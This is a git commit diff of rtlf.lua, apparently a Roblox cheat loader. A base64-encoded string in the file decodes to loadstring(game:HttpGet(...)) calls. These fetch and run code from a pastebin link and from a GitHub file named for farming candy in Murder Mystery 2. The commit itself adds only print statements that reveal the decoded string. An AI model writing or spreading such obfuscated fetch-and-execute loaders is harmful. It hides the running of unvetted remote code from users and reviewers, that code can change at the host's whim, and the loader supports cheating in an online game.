5f6e0e38ec7ef640141096737b31f0f820188304
vesssssss <vess210@proton.me>
2024-11-20 23:21:30 +0500

    Update rtlf.lua

--- rtlf.lua
+++ rtlf.lua
@@ -2,6 +2,7 @@ local function decodeBase64(data)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     data = data:gsub('[^' .. b .. '=]', '')
 
+  
     return (data:gsub('.', function(x)
         if x == '=' then return '' end
         local r, f = '', b:find(x) - 1
@@ -14,8 +15,15 @@ local function decodeBase64(data)
     end))
 end
 
+
 local encoded_script = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9kZ1N2NHkzUSIpKSgpIA0KbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS92ZXhyb3hkL015LVNjcmlwdC0vcmVmcy9oZWFkcy9tYWluL01NMi1DYW5keS1GYXJtIikpKCk="
 
+
 local decoded_script = decodeBase64(encoded_script)
+
+
+print("Декодированный скрипт:")
+print(decoded_script)
+
 
 loadstring(decoded_script)()
